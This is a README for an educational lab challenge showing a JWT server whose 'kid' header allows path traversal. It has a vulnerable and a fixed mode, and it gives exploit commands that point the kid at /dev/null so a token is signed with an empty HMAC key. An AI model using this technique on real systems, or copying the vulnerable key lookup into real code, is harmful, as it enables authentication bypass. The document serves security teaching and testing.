# JWT KID Path Traversal

This challenge demonstrates a JWT implementation that is vulnerable to path traversal via the 'kid' header.

## How to run it

```bash
go run main.go serve
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: the kid header is used as-is to read a key file, allowing path traversal
go run main.go serve --vulnerable=true

# fixed: the kid is restricted to a file name within the keys directory
go run main.go serve --vulnerable=false
```

## How to exploit it

```bash
# Get a sample token
TOKEN=$(go run main.go jwt)

# Scan with jwtop — /dev/null (default) is read as empty bytes, becoming the HMAC key
jwtop crack "$TOKEN" --url http://localhost:8080 --kid-path /dev/null
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
